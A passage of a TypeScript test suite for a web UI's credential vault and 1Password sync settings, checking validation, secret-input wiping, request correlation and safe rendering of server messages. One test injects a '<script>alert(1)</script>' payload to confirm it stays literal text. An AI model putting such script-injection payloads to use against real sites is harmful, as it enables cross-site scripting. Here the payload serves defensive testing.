      expect(first.querySelector('.vault-chip.shadowed')).toBeNull()

      // Row 2: shadowed warning glyph with the exact tooltip + description.
      const second = rows[1] as HTMLElement
      expect(second.classList.contains('shadowed')).toBe(true)
      const warn = second.querySelector('.vault-chip.shadowed') as HTMLElement
      expect(warn).not.toBeNull()
      expect(warn.title).toBe(
        "Defined by the server's environment — edits here won't take effect")
      expect(second.querySelector('.skill-row-badge')!.textContent).toBe('1P token')
      expect(second.textContent).toContain('For deploys')

      // Shrink + empty re-renders (full replacement, not append).
      m.handleFrame({ type: 'vault-list', items: [listFrame().items[0]] })
      expect(document.querySelectorAll('#vault-list .vault-row').length).toBe(1)
      m.handleFrame({ type: 'vault-list', items: [] })
      expect(document.querySelectorAll('#vault-list .vault-row').length).toBe(0)
      expect(el('vault-list').textContent).toContain('Nothing stored yet')
    })

    it('the env var name is auto-derived from the friendly Name (with live preview + override)', () => {
      const ve = M().VaultEngine
      expect(ve.deriveVarName('Notion API Key')).toBe('NOTION_API_KEY')
      expect(ve.deriveVarName('  spaces & symbols!! ')).toBe('SPACES_SYMBOLS')
      expect(ve.deriveVarName('123 starts numeric')).toBe('_123_STARTS_NUMERIC')

      input('vault-name-input').value = 'Notion API Key'
      fire(input('vault-name-input'), 'input')
      expect(el('vault-var-preview').textContent).toBe('NOTION_API_KEY')

      // "change" reveals the advanced override, prefilled with the derivation;
      // the preview then follows the override.
      el('vault-var-edit').click()
      const override = input('vault-var-input')
      expect(override.hidden).toBe(false)
      expect(override.value).toBe('NOTION_API_KEY')
      override.value = 'MY_CUSTOM_KEY'
      fire(override, 'input')
      expect(el('vault-var-preview').textContent).toBe('MY_CUSTOM_KEY')
    })

    it('validation failures stay local — no frame ever leaves the client', () => {
      const add = el('vault-add-btn')
      const status = el('vault-status-line')

      // Empty name.
      input('vault-value-input').value = 'sk-something'
      add.click()
      expect(sentFrames.length).toBe(0)
      expect(status.hidden).toBe(false)
      expect(status.textContent).toContain('name')

      // Invalid env var override.
      input('vault-name-input').value = 'Notion API Key'
      el('vault-var-edit').click()
      input('vault-var-input').value = 'BAD-NAME'
      fire(input('vault-var-input'), 'input')
      add.click()
      expect(sentFrames.length).toBe(0)

      // Empty value.
      input('vault-var-input').value = 'GOOD_NAME'
      fire(input('vault-var-input'), 'input')
      input('vault-value-input').value = ''
      add.click()
      expect(sentFrames.length).toBe(0)

      // Value with a newline: jsdom (like real browsers) strips line breaks
      // on input.value assignment, so shadow the accessor to exercise the
      // engine's own defence-in-depth check.
      const valueInput = input('vault-value-input')
      Object.defineProperty(valueInput, 'value', {
        configurable: true, get: () => 'line1\nline2', set: () => {},
      })
      add.click()
      expect(sentFrames.length).toBe(0)
      expect(status.textContent).toContain('line breaks')
      delete (valueInput as any).value   // restore the prototype accessor

      // Socket not OPEN: valid form, but the OPEN guard must block the send
      // (WebSocketEngine.send logs the WHOLE frame when not open).
      valueInput.value = 'sk-123'
      M().State.ws = { readyState: WebSocket.CLOSED }
      add.click()
      expect(sentFrames.length).toBe(0)
      expect(status.textContent).toContain('Not connected')
      // …and the un-sent value is kept so the operator can retry.
      expect(valueInput.value).toBe('sk-123')
    })

    it('a valid submit sends vault-put once and one-shot wipes the value input', () => {
      input('vault-name-input').value = 'Notion API Key'
      fire(input('vault-name-input'), 'input')
      input('vault-value-input').value = 'sk-super-secret'
      input('vault-desc-input').value = 'workspace key'
      el('vault-add-btn').click()

      expect(sentFrames.length).toBe(1)
      const frame = sentFrames[0]
      expect(frame).toMatchObject({
        type: 'vault-put',
        name: 'Notion API Key',
        kind: 'env-secret',
        varName: 'NOTION_API_KEY',
        value: 'sk-super-secret',
        description: 'workspace key',
      })
      expect(frame.requestId).toMatch(/^vlt_/)
      expect(frame.label).toBeUndefined()

      // One-shot: the value is gone from the DOM the moment the frame left.
      expect(input('vault-value-input').value).toBe('')
      // The rest of the form survives until the server confirms.
      expect(input('vault-name-input').value).toBe('Notion API Key')
      expect(el('vault-status-line').textContent).toContain('Saving')
    })

    it('op-token kind swaps in the label field + restart warning and sends label (no varName)', () => {
      const kind = el<HTMLSelectElement>('vault-kind-select')
      kind.value = 'op-token'
      fire(kind, 'change')

      expect(input('vault-label-input').hidden).toBe(false)
      expect(el('vault-var-row').hidden).toBe(true)
      // Saving an op-token warns about the server restart up front.
      expect(el('vault-restart-note').hidden).toBe(false)
      expect(el('vault-restart-note').textContent).toContain('restarts')

      input('vault-name-input').value = 'Deploy Token'
      input('vault-value-input').value = 'ops_abc123'
      el('vault-add-btn').click()

      const frame = sentFrames.find((f) => f.type === 'vault-put')
      expect(frame).toMatchObject({
        kind: 'op-token', name: 'Deploy Token', label: 'primary', value: 'ops_abc123',
      })
      expect(frame.varName).toBeUndefined()
      expect(input('vault-value-input').value).toBe('')          // one-shot wipe
      expect(el('vault-status-line').textContent).toContain('restart')
    })

    it('delete is a two-step inline confirm; op-token rows warn about the restart', () => {
      const m = M()
      m.handleFrame(listFrame())
      const rowDelete = (i: number) =>
        document.querySelectorAll('#vault-list .vault-row')[i]!
          .querySelector('.connector-btn.danger') as HTMLElement

      // First click ARMS — nothing on the wire yet.
      rowDelete(0).click()
      expect(sentFrames.filter((f) => f.type === 'vault-delete').length).toBe(0)
      let armed = document.querySelectorAll('#vault-list .vault-row')[0]!
      expect(armed.textContent).toContain('Remove this credential?')

      // Keep cancels.
      const keep = Array.from(armed.querySelectorAll('.connector-btn'))
        .find((b) => b.textContent === 'Keep') as HTMLElement
      keep.click()
      expect(sentFrames.filter((f) => f.type === 'vault-delete').length).toBe(0)
      expect(document.querySelectorAll('#vault-list .vault-row')[0]!.textContent)
        .not.toContain('Remove this credential?')

      // Arm again, confirm — exactly one vault-delete with the row id.
      rowDelete(0).click()
      rowDelete(0).click()   // the armed row's danger button IS the confirm
      const delFrames = sentFrames.filter((f) => f.type === 'vault-delete')
      expect(delFrames.length).toBe(1)
      expect(delFrames[0]).toMatchObject({ id: 'itm-1' })
      expect(delFrames[0].requestId).toMatch(/^vlt_/)

      // An armed op-token row warns the server restarts.
      rowDelete(1).click()
      const opArmed = document.querySelectorAll('#vault-list .vault-row')[1]!
      expect(opArmed.textContent).toContain('Remove? The server restarts.')
    })

    it('vault-status correlates by requestId; ok clears the form; message renders as text', () => {
      const m = M()
      input('vault-name-input').value = 'Notion API Key'
      input('vault-value-input').value = 'sk-secret'
      el('vault-add-btn').click()
      const reqId = sentFrames[0].requestId
      const status = el('vault-status-line')

      // A status for someone ELSE's request is ignored (stale/unmatched).
      m.handleFrame({ type: 'vault-status', requestId: 'vlt_other', ok: false, message: 'nope' })
      expect(status.textContent).toContain('Saving')
      expect(input('vault-name-input').value).toBe('Notion API Key')

      // The matching ok lands: message shown via textContent (never parsed as
      // HTML) and the form clears.
      m.handleFrame({
        type: 'vault-status', requestId: reqId, ok: true,
        message: '<b>Saved NOTION_API_KEY</b>',
      })
      expect(status.textContent).toBe('<b>Saved NOTION_API_KEY</b>')
      expect(status.querySelector('b')).toBeNull()
      expect(input('vault-name-input').value).toBe('')
      expect(input('vault-desc-input').value).toBe('')

      // A failed put keeps the typed fields so the operator can fix + resend.
      input('vault-name-input').value = 'Other Key'
      input('vault-value-input').value = 'sk-2'
      el('vault-add-btn').click()
      const req2 = sentFrames[sentFrames.length - 1].requestId
      m.handleFrame({ type: 'vault-status', requestId: req2, ok: false, message: 'env var name invalid' })
      expect(status.textContent).toBe('env var name invalid')
      expect(input('vault-name-input').value).toBe('Other Key')
      // …but the value was already one-shot wiped on send regardless.
      expect(input('vault-value-input').value).toBe('')
    })

    it('closing the settings modal wipes a typed-but-unsent value', () => {
      const m = M()
      vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})
      el('toggle-settings').click()   // open the modal
      input('vault-value-input').value = 'sk-typed-then-abandoned'
      el('close-settings-btn').click()
      expect(input('vault-value-input').value).toBe('')
    })

    it('a socket close wipes a typed-but-unsent value (op-token saves restart the server)', () => {
      const m = M()
      class FakeWS extends EventTarget {
        static OPEN = 1; static CONNECTING = 0; static CLOSING = 2; static CLOSED = 3
        readyState = FakeWS.OPEN
        url: string
        constructor(url: string) { super(); this.url = url }
        send() {}
        close() { this.readyState = FakeWS.CLOSED }
      }
      const RealWS = globalThis.WebSocket
      ;(globalThis as any).WebSocket = FakeWS
      try {
        m.State.ws = null            // fresh connect (no stale fake to tear down)
        m.WebSocketEngine.connect()
        expect(m.State.ws).toBeInstanceOf(FakeWS)
        input('vault-value-input').value = 'sk-mid-flight'
        m.State.ws.dispatchEvent(new Event('close'))
        expect(input('vault-value-input').value).toBe('')
      } finally {
        ;(globalThis as any).WebSocket = RealWS
      }
    })

    // ── Finding #1: collapse-path wipe ───────────────────────────────────────
    it('chat-collapse path wipes the vault value, op-token input, and secret-prompt input', async () => {
      const m = M()
      vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})

      // Open the chat panel then the settings panel.
      const chatPanel = document.getElementById('chat-panel')!
      chatPanel.classList.add('active')
      el('toggle-settings').click()
      expect(chatPanel.classList.contains('active')).toBe(true)
      expect(el('settings-panel').classList.contains('active')).toBe(true)

      // Type values into the three sensitive inputs.
      input('vault-value-input').value = 'sk-collapse-test'
      const opIn = document.getElementById('op-token-input') as HTMLInputElement | null
      if (opIn) opIn.value = 'ops_collapse'
      const secretIn = document.getElementById('secret-prompt-input') as HTMLInputElement | null
      if (secretIn) secretIn.value = 'my-secret'

      // Clicking close-chat collapses the chat — this is the collapse path that
      // previously bypassed SettingsEngine.close().
      el('close-chat').click()

      // Allow async microtasks from toggleChat to flush.
      await Promise.resolve()
      await Promise.resolve()

      expect(chatPanel.classList.contains('active')).toBe(false)
      expect(input('vault-value-input').value).toBe('')
      if (opIn)     expect(opIn.value).toBe('')
      if (secretIn) expect(secretIn.value).toBe('')
    })

    // ── Finding #2: stale in-flight request across socket drop ───────────────
    it('socket drop clears _reqId/_reqKind and replaces Saving… for env-secret and delete; leaves op-token status', () => {
      const m = M()
      const ve = M().VaultEngine

      class FakeWS extends EventTarget {
        static OPEN = 1; static CONNECTING = 0; static CLOSING = 2; static CLOSED = 3
        readyState = FakeWS.OPEN
        url: string
        constructor(url: string) { super(); this.url = url }
        send() {}
        close() { this.readyState = FakeWS.CLOSED }
      }
      const RealWS = globalThis.WebSocket
      ;(globalThis as any).WebSocket = FakeWS
      try {
        m.State.ws = null
        m.WebSocketEngine.connect()
        const ws = m.State.ws as typeof FakeWS.prototype

        // ── env-secret put in flight ──
        m.WebSocketEngine.send = (f: any) => { sentFrames.push(f) }
        // Seed an in-flight env-secret put directly (status already 'Saving…').
        ve._reqId = 'vlt_test_env'
        ve._reqKind = 'put'
        ve.setStatus('Saving…', 'info')
        ws.dispatchEvent(new Event('close'))
        expect(ve._reqId).toBeNull()
        expect(ve._reqKind).toBeNull()
        expect(el('vault-status-line').textContent).toContain('Connection lost')

        // ── op-token put in flight — status must survive ──
        m.State.ws = null
        m.WebSocketEngine.connect()
        const ws2 = m.State.ws as typeof FakeWS.prototype
        ve._reqId = 'vlt_test_op'
        ve._reqKind = 'put-op-token'
        ve.setStatus('Verifying… the server will restart briefly.', 'info')
        ws2.dispatchEvent(new Event('close'))
        expect(ve._reqId).toBeNull()
        expect(ve._reqKind).toBeNull()
        // Status must NOT be overwritten — the restart drop is expected.
        expect(el('vault-status-line').textContent).toContain('Verifying')
      } finally {
        ;(globalThis as any).WebSocket = RealWS
      }
    })

    // ── Finding #3: defensive coercion in render() ───────────────────────────
    it('render() with a row missing fields shows empty strings not "undefined"', () => {
      const m = M()
      // Push a vault-list with a malformed row: name/ref/source/description absent.
      m.handleFrame({
        type: 'vault-list',
        items: [
          {
            id: 'bad-row',
            // name, kind, ref, source, description intentionally omitted
          },
        ],
      })
      const rows = document.querySelectorAll('#vault-list .vault-row')
      expect(rows.length).toBe(1)
      const row = rows[0]!
      // None of the text content should contain the literal string 'undefined'.
      expect(row.textContent).not.toContain('undefined')
      // The ref span must be empty string, not 'undefined'.
      expect(row.querySelector('.vault-ref')!.textContent).toBe('')
    })

    // ── 1Password sync sub-section ────────────────────────────────────────────
    // These tests drive the sync section that lives BELOW the add form, rendered
    // by VaultEngine.renderSync() from State.vaultSync. Key invariants:
    //   - section renders from vault-list .sync; idempotent re-render is a no-op
    //   - enable+save sends the exact vault-sync-config frame (OPEN-guard)
    //   - sync ack (vault-status with a sync requestId) NEVER clears the add form
    //   - lastError renders via textContent (server HTML stays literal)
    // ─────────────────────────────────────────────────────────────────────────

    it('sync section renders from a vault-list with .sync state', () => {
      const m = M()
      m.handleFrame({
        type: 'vault-list',
        items: [],
        sync: {
          enabled: true,
          opLabel: 'primary',
          opVault: 'Luna',
          pollSeconds: 120,
          lastSyncedAt: Date.now() - 4 * 60 * 1000, // 4 minutes ago
          lastError: null,
        },
      })

      // State was stored.
      expect(m.State.vaultSync).toMatchObject({ enabled: true, opLabel: 'primary' })

      // Status line shows 'Sync: on' + relative time.
      const state = el('vault-sync-state')
      expect(state.textContent).toContain('Sync: on')
      expect(state.textContent).toMatch(/\d+m ago/)

      // Enabled checkbox is checked.
      const checkbox = input('vault-sync-enabled') as HTMLInputElement
      expect(checkbox.checked).toBe(true)

      // Fields are populated from server state.
      expect(input('vault-sync-op-label').value).toBe('primary')
      expect(input('vault-sync-op-vault').value).toBe('Luna')
      expect(input('vault-sync-poll').value).toBe('120')

      // When sync is enabled, the Apple Passwords import nudge is visible.
      expect(el('vault-sync-import-note').hidden).toBe(false)

      // Error line is hidden when lastError is null.
      expect(el('vault-sync-error').hidden).toBe(true)
    })

    it('sync section: lastError renders via textContent (HTML stays literal)', () => {
      const m = M()
      const htmlPayload = '<script>alert(1)</script>'
      m.handleFrame({
        type: 'vault-list',
        items: [],
        sync: {
          enabled: false,
          opLabel: 'primary',
          opVault: 'Luna',
          lastError: htmlPayload,
        },
      })

      const errEl = el('vault-sync-error')
      // textContent means the raw HTML string is shown, not parsed.
      expect(errEl.textContent).toBe(htmlPayload)
      // No <script> element was injected into the DOM.
      expect(errEl.querySelector('script')).toBeNull()
      expect(errEl.hidden).toBe(false)

      // When sync is disabled the import nudge is hidden.
      expect(el('vault-sync-import-note').hidden).toBe(true)
    })

    it('sync section idempotent re-render: re-delivering the same frame does not duplicate elements', () => {
      const m = M()
      const frame = {
        type: 'vault-list',
        items: [],
        sync: { enabled: true, opLabel: 'primary', opVault: 'Luna' },
      }
      m.handleFrame(frame)
      m.handleFrame(frame)
      m.handleFrame(frame)

      // The sync section exists exactly once (no duplicates from re-renders).
      expect(document.querySelectorAll('#vault-sync-section').length).toBe(1)
      expect(document.querySelectorAll('#vault-sync-enabled').length).toBe(1)
    })

    it('enable+save sends exact vault-sync-config frame with the OPEN-socket guard', () => {
      const m = M()

      // Pre-populate op-label and vault name.
      const labelInput = input('vault-sync-op-label')
      const vaultInput = input('vault-sync-op-vault')
      const pollInput  = input('vault-sync-poll')
      const checkbox   = input('vault-sync-enabled') as HTMLInputElement

      checkbox.checked = true
      labelInput.value = 'primary'
      vaultInput.value = 'Luna'
      pollInput.value  = '180'

      // ── OPEN socket: frame goes out ──────────────────────────────────────────
      m.State.ws = { readyState: WebSocket.OPEN }
      el('vault-sync-save-btn').click()

      expect(sentFrames.length).toBe(1)
      const frame = sentFrames[0]
      expect(frame).toMatchObject({
        type: 'vault-sync-config',
        enabled: true,
        opLabel: 'primary',
        opVault: 'Luna',
        pollSeconds: 180,
      })
      expect(frame.requestId).toMatch(/^vlt_/)
      // No credential value in the frame — this is a config-only send.
      expect(frame.value).toBeUndefined()

      sentFrames.length = 0

      // ── NOT-OPEN socket: guard blocks the send; status is value-free ─────────
      m.State.ws = { readyState: WebSocket.CLOSED }
      el('vault-sync-save-btn').click()

      // Nothing was sent.
      expect(sentFrames.length).toBe(0)
      // A value-free status message is shown (no credential content).
      const syncStatus = el('vault-sync-status')
      expect(syncStatus.hidden).toBe(false)
      expect(syncStatus.textContent).toContain('Not connected')
      // Crucially: the status text does NOT contain any credential/config value.
      expect(syncStatus.textContent).not.toContain('primary')
      expect(syncStatus.textContent).not.toContain('Luna')
    })

    it('sync ack (vault-status with sync requestId) does NOT wipe the half-typed add form', () => {
      const m = M()

      // Type into the add form (simulating the user mid-entry).
      input('vault-name-input').value = 'Half-typed Name'
      input('vault-value-input').value = 'sk-half-typed'
      input('vault-desc-input').value = 'some note'

      // Send a sync-config (triggers _reqKind = 'sync').
      m.State.ws = { readyState: WebSocket.OPEN }
      el('vault-sync-save-btn').click()
      const syncReqId = sentFrames[sentFrames.length - 1].requestId

      // Arrive sync ack.
      m.handleFrame({ type: 'vault-status', requestId: syncReqId, ok: true, message: 'Sync saved.' })

      // Sync status shows ok.
      const syncStatus = el('vault-sync-status')
      expect(syncStatus.textContent).toBe('Sync saved.')

      // The ADD FORM is untouched — name + value fields kept.
      expect(input('vault-name-input').value).toBe('Half-typed Name')
      expect(input('vault-value-input').value).toBe('sk-half-typed')
      expect(input('vault-desc-input').value).toBe('some note')
      // The add-form status line was NOT changed (not an add-form ack).
      expect(el('vault-status-line').textContent).toBe('')
    })

    it('a failed sync ack surfaces the message on the sync status line, not the add form', () => {
      const m = M()

      // Populate add form to confirm it stays untouched.
      input('vault-name-input').value = 'My Key'
      input('vault-value-input').value = 'sk-mine'

      m.State.ws = { readyState: WebSocket.OPEN }
      el('vault-sync-save-btn').click()
      const reqId = sentFrames[sentFrames.length - 1].requestId

      m.handleFrame({
        type: 'vault-status', requestId: reqId, ok: false,
        message: '<b>vault not found</b>',
      })

      // Sync status shows the error via textContent (no HTML parsed).
      const syncStatus = el('vault-sync-status')
      expect(syncStatus.textContent).toBe('<b>vault not found</b>')
      expect(syncStatus.querySelector('b')).toBeNull()

      // Add form untouched.
      expect(input('vault-name-input').value).toBe('My Key')
      expect(input('vault-value-input').value).toBe('sk-mine')

      // Add-form status line unchanged.
      expect(el('vault-status-line').textContent).toBe('')
    })

    it('op-label placeholder is derived from existing op-token items in the registry', () => {
      const m = M()
      // Push a vault-list with an op-token row; the label in ref = 'primary'.
      m.handleFrame({
        type: 'vault-list',
        items: [
          {
            id: 'tok-1', name: 'Primary Token', kind: 'op-token',
            ref: 'luna-op://myaccount', source: 'manual', description: null,
            createdAt: 1, updatedAt: 1, synced: false, shadowed: false,
          },
        ],
        sync: { enabled: false, opLabel: '', opVault: 'Luna' },
      })

      // The label input placeholder should be derived from the op-token ref.
      const labelInput = input('vault-sync-op-label')
      expect(labelInput.placeholder).toBe('myaccount')
    })

    it('pollSeconds value is clamped to minimum 60 on send', () => {
      const m = M()
      m.State.ws = { readyState: WebSocket.OPEN }

      const pollInput = input('vault-sync-poll')
      pollInput.value = '10'   // below minimum
      el('vault-sync-save-btn').click()

      const frame = sentFrames.find((f) => f.type === 'vault-sync-config')
      expect(frame).toBeDefined()
      expect(frame.pollSeconds).toBe(60)   // clamped to floor
    })

    // ── Fix 1: socket-close sync status isolation ─────────────────────────────
    it('socket drop with in-flight sync save routes the lost-connection message to the sync status line, not the add-form line', () => {
      const m = M()
      const ve = M().VaultEngine

      class FakeWS2 extends EventTarget {
        static OPEN = 1; static CONNECTING = 0; static CLOSING = 2; static CLOSED = 3
        readyState = FakeWS2.OPEN
        url: string
        constructor(url: string) { super(); this.url = url }
        send() {}
        close() { this.readyState = FakeWS2.CLOSED }
      }
      const RealWS = globalThis.WebSocket
      ;(globalThis as any).WebSocket = FakeWS2
      try {
        m.State.ws = null
        m.WebSocketEngine.connect()
        const ws = m.State.ws as typeof FakeWS2.prototype

        // Seed a sync save in-flight directly.
        ve._syncReqId = 'vlt_sync_lost'
        ve.setSyncStatus('Saving sync settings…', 'info')
        // Ensure add-form status is empty before drop.
        ve.setStatus('', null)

        ws.dispatchEvent(new Event('close'))

        // The sync slot is cleared.
        expect(ve._syncReqId).toBeNull()
        // The SYNC status line shows the connection-lost message.
        expect(el('vault-sync-status').textContent).toContain('Connection lost')
        // The ADD-FORM status line must NOT be touched.
        expect(el('vault-status-line').textContent).toBe('')
      } finally {
        ;(globalThis as any).WebSocket = RealWS
      }
    })

    it('applyCapability(false) clears a stale sync status line', () => {
      const m = M()
      const ve = M().VaultEngine

      // Seed a stuck 'Saving sync settings…' on the sync line.
      ve.setSyncStatus('Saving sync settings…', 'info')
      expect(el('vault-sync-status').hidden).toBe(false)

      // Channel switch to an older server drops vault capability.
      m.handleFrame({
        type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false },
      })

      // The sync status line must be hidden/cleared after the capability drop.
      expect(el('vault-sync-status').hidden).toBe(true)
    })

    // ── Fix 2: separate sync slot — both acks resolve independently ───────────
    it('put + sync save in flight together: both vault-status acks land on their own status lines', () => {
      const m = M()
      const ve = M().VaultEngine

      m.State.ws = { readyState: WebSocket.OPEN }

      // Kick off an add-form put.
      input('vault-name-input').value = 'Notion API Key'
      fire(input('vault-name-input'), 'input')
      input('vault-value-input').value = 'sk-concurrent'
      el('vault-add-btn').click()
      const putReqId = sentFrames[sentFrames.length - 1].requestId

      // Kick off a sync save (uses a different slot, does not displace the put).
      input('vault-sync-op-label').value = 'primary'
      input('vault-sync-op-vault').value = 'Luna'
      el('vault-sync-save-btn').click()
      const syncReqId = sentFrames[sentFrames.length - 1].requestId

      // Both slots are live.
      expect(ve._reqId).toBe(putReqId)
      expect(ve._syncReqId).toBe(syncReqId)

      // Sync ack arrives first.
      m.handleFrame({ type: 'vault-status', requestId: syncReqId, ok: true, message: 'Sync ok.' })
      expect(ve._syncReqId).toBeNull()
      expect(ve._reqId).toBe(putReqId)          // put slot untouched
      expect(el('vault-sync-status').textContent).toBe('Sync ok.')
      // Add-form status line must not have been touched by the sync ack.
      expect(el('vault-status-line').textContent).toContain('Saving')

      // Put ack arrives second.
      m.handleFrame({ type: 'vault-status', requestId: putReqId, ok: true, message: 'Saved.' })
      expect(ve._reqId).toBeNull()
      expect(el('vault-status-line').textContent).toBe('Saved.')
    })

    // ── Fix 3: checkbox dirty flag ────────────────────────────────────────────
    it('user toggle survives a concurrent vault-list broadcast with opposite server state', () => {
      const m = M()

      // Server says sync is OFF.
      m.handleFrame({
        type: 'vault-list', items: [],
        sync: { enabled: false, opLabel: 'primary', opVault: 'Luna', pollSeconds: 300 },
      })
      const checkbox = input('vault-sync-enabled') as HTMLInputElement
      expect(checkbox.checked).toBe(false)

      // User toggles ON manually (marks dirty).
      checkbox.checked = true
      fire(checkbox, 'change')
      expect(M().VaultEngine._syncCheckboxDirty).toBe(true)

      // Server broadcasts a vault-list with enabled=false (e.g. another client saved).
      m.handleFrame({
        type: 'vault-list', items: [],
        sync: { enabled: false, opLabel: 'primary', opVault: 'Luna', pollSeconds: 300 },
      })

      // The user's toggle must survive — checkbox still ON.
      expect(checkbox.checked).toBe(true)
    })

    it('after a successful sync save ack, a subsequent vault-list applies the server state again', () => {
      const m = M()
      const ve = M().VaultEngine

      // Server says OFF; user toggles ON; save is sent.
      m.handleFrame({
        type: 'vault-list', items: [],
        sync: { enabled: false, opLabel: 'primary', opVault: 'Luna', pollSeconds: 300 },
      })
      const checkbox = input('vault-sync-enabled') as HTMLInputElement
      checkbox.checked = true
      fire(checkbox, 'change')

      m.State.ws = { readyState: WebSocket.OPEN }
      el('vault-sync-save-btn').click()
      const syncReqId = sentFrames[sentFrames.length - 1].requestId

      // Successful ack — dirty flag should be cleared.
      m.handleFrame({ type: 'vault-status', requestId: syncReqId, ok: true, message: 'Saved.' })
      expect(ve._syncCheckboxDirty).toBe(false)

      // Now a vault-list arrives with enabled=false (hypothetical server-side rollback).
      m.handleFrame({
        type: 'vault-list', items: [],
        sync: { enabled: false, opLabel: 'primary', opVault: 'Luna', pollSeconds: 300 },
      })
      // Dirty flag is clear, so server state is applied (checkbox reverts to OFF).
      expect(checkbox.checked).toBe(false)
    })

    // ── Fix 4: poll-seconds seeded from State.vaultSync.pollSeconds ───────────
    it('renderSync seeds poll-seconds input from sync.pollSeconds (now a legitimate wire field)', () => {
      const m = M()

      // Frame includes pollSeconds — the now-standard wire shape.
      m.handleFrame({
        type: 'vault-list', items: [],
        sync: {
          enabled: true, opLabel: 'primary', opVault: 'Luna',
          pollSeconds: 600,
        },
      })

      // The poll input must be populated from the wire value, not the hardcoded 300.
      expect(input('vault-sync-poll').value).toBe('600')
    })

    it('renderSync falls back to 300 when sync.pollSeconds is absent', () => {
      const m = M()

      // Frame without pollSeconds (e.g. older server or initial state).
      m.handleFrame({
        type: 'vault-list', items: [],
        sync: { enabled: true, opLabel: 'primary', opVault: 'Luna' },
      })

      // Fallback: 300 is used when pollSeconds is absent.
      expect(input('vault-sync-poll').value).toBe('300')
    })

    // ── C3: serverSupportsVault guard on submitAdd / requestDelete / submitSyncConfig ──
    it('C3: serverSupportsVault=false + OPEN socket — no frame sent, error status shown on submitAdd', () => {
      const m = M()
      // Switch to a server that does NOT advertise vault support.
      m.handleFrame({
        type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false },
      })
      // Socket is open but server does not support vault.
      m.State.ws = { readyState: WebSocket.OPEN }

      // Fill in a valid form so the only blocker is the vault-support flag.
      input('vault-name-input').value = 'Test Key'
      fire(input('vault-name-input'), 'input')
      input('vault-value-input').value = 'sk-abc'

      // Attempt to add — must be blocked.
      el('vault-add-btn').click()

      expect(sentFrames.filter((f: any) => f.type === 'vault-put').length).toBe(0)
      const status = el('vault-status-line')
      expect(status.hidden).toBe(false)
      expect(status.textContent).toContain("doesn't support the Vault")
    })

    it('C3: serverSupportsVault=false + OPEN socket — no frame sent on requestDelete (two-step confirm)', () => {
      const m = M()
      // Seed the registry so there is a row to delete.
      m.handleFrame({
        type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false, vault: true },
      })
      m.handleFrame({
        type: 'vault-list',
        items: [
          { id: 'del-1', name: 'Old Key', kind: 'env-secret', ref: 'env:OLD_KEY',
            source: 'manual', description: null, createdAt: 1, updatedAt: 1,
            synced: false, shadowed: false },
        ],
      })

      // Now drop vault support (channel switch to old server).
      m.handleFrame({
        type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false },
      })
      m.State.ws = { readyState: WebSocket.OPEN }

      // The vault section is hidden (old server path), but we can still invoke
      // requestDelete directly to exercise the guard.
      const ve = M().VaultEngine
      ve._confirmId = 'del-1'   // arm the row manually
      ve.requestDelete('del-1') // second click → should hit the guard

      expect(sentFrames.filter((f: any) => f.type === 'vault-delete').length).toBe(0)
    })

    it('C3: serverSupportsVault=false + OPEN socket — no frame sent on submitSyncConfig, sync status shown', () => {
      const m = M()
      m.handleFrame({
        type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false },
      })
      m.State.ws = { readyState: WebSocket.OPEN }

      el('vault-sync-save-btn').click()

      expect(sentFrames.filter((f: any) => f.type === 'vault-sync-config').length).toBe(0)
      const syncStatus = el('vault-sync-status')
      expect(syncStatus.hidden).toBe(false)
      expect(syncStatus.textContent).toContain("doesn't support the Vault")
    })

    // ── C4: wipeSecretInputs covers connector client-secret password input ──────
    it('C4: wipeSecretInputs clears dynamically-created password inputs inside connectors-list', () => {
      const m = M()
      vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})

      // Grab the connectors-list element and inject a fake connector client-setup
      // form with a password input — simulating what ConnectorsEngine.render() does.
      const connectorsList = document.getElementById('connectors-list')
      expect(connectorsList).not.toBeNull()

      const fakeSetup = document.createElement('div')
      fakeSetup.className = 'connector-client-setup'
      const fakeSecret = document.createElement('input')
      fakeSecret.type = 'password'
      fakeSecret.value = 'fake-client-secret-value'
      fakeSetup.appendChild(fakeSecret)
      connectorsList!.appendChild(fakeSetup)

      // Confirm it has the value.
      expect(fakeSecret.value).toBe('fake-client-secret-value')

      // wipeSecretInputs is not exported — exercise it via the settings-close path
      // (SettingsEngine.close calls wipeSecretInputs).
      el('toggle-settings').click()    // open settings modal
      el('close-settings-btn').click() // close → wipeSecretInputs runs

      // The connector password input must have been wiped.
      expect(fakeSecret.value).toBe('')
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: UserAsk / alignment-survey (Phase 3 D3, Moon-side wiring)
  //
  // The TUI already paints a survey modal when the server pushes a
  // `survey-request` frame; this suite is the Moon-UI parity. We drive the
  // pipeline at the same seam the production WS handler uses
  // (__MoonInternals.handleFrame), then poke buttons in the panel and assert
  // the resulting `survey-response` frame.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: UserAsk / alignment-survey panel', () => {
    const M = () => (window as any).__MoonInternals

    const sampleFrame = () => ({
      type: 'survey-request',
      surveyId: 'survey-1700',
      issuedAt: 1700,
      items: [
        { id: 'tq-1', kind: 'task_quality', prompt: 'How did Luna do on the last task?', ref: 'task-99' },
        { id: 'bv-1', kind: 'belief_validation', prompt: 'Sterling prefers concise replies.',
          ref: 'belief-7', beliefId: 'belief-7' },
        { id: 'bv-2', kind: 'belief_validation', prompt: 'Sterling works mostly on macOS.',
          ref: 'belief-8', beliefId: 'belief-8' },
      ],
    })

    beforeEach(() => {
      ;(window as any).requestAnimationFrame = (cb: FrameRequestCallback) => { cb(0); return 1 }
      ;(window as any).cancelAnimationFrame = () => {}
      const m = M()
      if (m && m.ChatState && typeof m.ChatState.reset === 'function') m.ChatState.reset()
      const panel = document.getElementById('user-ask-panel')
      if (panel) { panel.hidden = true; }
      const body = document.getElementById('user-ask-body')
      if (body) body.innerHTML = ''
      if (m && m.SurveyEngine) {
        m.SurveyEngine.pending = null
        m.SurveyEngine.answers = { likert: null, beliefAnswers: {} }
      }
    })

